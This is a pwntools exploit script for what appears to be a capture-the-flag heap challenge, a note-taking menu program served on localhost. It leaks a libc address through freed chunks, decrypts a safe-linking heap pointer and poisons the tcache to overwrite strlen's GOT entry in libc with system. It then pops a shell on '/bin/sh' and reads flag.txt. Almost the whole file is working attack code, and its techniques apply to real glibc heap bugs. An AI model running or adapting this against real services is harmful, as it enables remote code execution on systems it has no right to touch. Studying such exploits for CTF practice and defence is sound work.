#!/usr/bin/env python3
import sys, os
from pwn import *
context.update(
    arch="amd64",
    endian="little",
    os="linux",
    log_level="debug",
    terminal=["tmux", "split-window", "-h", "-p 65"],
)

REMOTE = False
TARGET= "./chall"
elf = ELF(TARGET)
HOST, PORT = 'localhost 11111'.split(' ')
libc = ELF("./libc.so.6")

heap_base_key = 0
def decrypt(cipher):
    key = 0
    plain = 0

    for i in range(1,6):
        bits = 64-12*i
        if(bits < 0): bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    global heap_base_key; heap_base_key = key
    return plain

def encrypt(plain):
    return (heap_base_key ^ plain)

def attach(p):
    if not REMOTE:
        bkps = []
        cmds = []
        gdb.attach(p, '\n'.join(["break {}".format(x) for x in bkps] + cmds))
    return

def add(index, size, data):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Page: ", str(index))
    p.sendlineafter("Lines: ", str(size//0x10))
    p.sendafter("Note: ", data)
    return

def edit(index, offset, data):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("Page: ", str(index))
    p.sendlineafter("Line: ", str(offset//0x10))
    p.sendafter("Note: ", data)
    return

def show(index, offset):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Page: ", str(index).encode())
    p.sendlineafter(b"Line: ", str(offset//0x10).encode())
    return
    
def delete(index):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("Page: ", str(index))
    return

def exploit(p):
    offset = 0x21a090 # strlen_evex@got

    for i in range(8):
        add(10+i,0x400,b"A"*0x10)
    for i in range(7):
        delete(11+i)
    delete(10)
    show(10, 0)
    libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ace0
    log.info("libc_base: 0x{:x}".format(libc_base))
    system = libc_base + libc.sym["system"]
    add(0, 0x10, b"/bin/sh\x00"*2)
    add(1, 0x10, b"A"*0x10)
    add(2, 0x10, b"A"*0x10)
    delete(1)
    delete(2)

    show(2, 0)
    leak = u64(p.recv(6).ljust(8, b"\x00"))
    heap_ptr = decrypt(leak)
    log.info("heap_ptr: 0x{:x}".format(heap_ptr))
    edit(2, 0, p64(encrypt(libc_base+offset))*2)
    add(3, 0x10, "AAAAA")
    add(3, 0x10, p64(system)*2)
    show(0,0)    

    p.sendline("cat flag.txt")
    print(p.recv(0x100))
    p.interactive()
    return

if __name__ == "__main__":
    p = remote(HOST, PORT)
    exploit(p)
    exit(0)